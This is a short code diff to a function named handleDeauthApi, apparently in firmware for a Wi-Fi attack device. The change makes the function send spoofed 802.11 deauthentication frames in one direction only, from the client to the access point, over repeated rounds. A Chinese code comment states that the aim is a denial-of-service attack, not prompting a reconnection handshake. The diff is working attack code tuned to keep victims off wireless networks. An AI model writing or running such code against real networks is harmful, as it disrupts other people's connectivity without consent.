@@ -69,21 +69,11 @@ void handleDeauthApi(HttpClient& client) {
         delay(100);
     }
 
-    bool is_multicast = (mac[0] & 0x01);
     for (int r = 0; r < rounds; r++) {
         for (int p = 0; p < 10; p++) {
-            // AP -> Client
-            wifi_tx_deauth_frame_ext(bssid, mac, bssid, 0x06);
+            // 伪造客户端单方向往AP发送deauth帧已经足够，目的不是尽快触发重新握手而是DoS攻击
+            wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x06);
             delayMicroseconds(100);
-            if (!is_multicast) {
-                // Client -> AP
-                wifi_tx_deauth_frame_ext(mac, bssid, bssid, 0x06);
-                delayMicroseconds(100);
-            } else {
-                // AP -> Client (duplicate to maintain packet count if destination is broadcast/multicast)
-                wifi_tx_deauth_frame_ext(bssid, mac, bssid, 0x06);
-                delayMicroseconds(100);
-            }
         }
         if (r < rounds - 1) {
             delay(100);
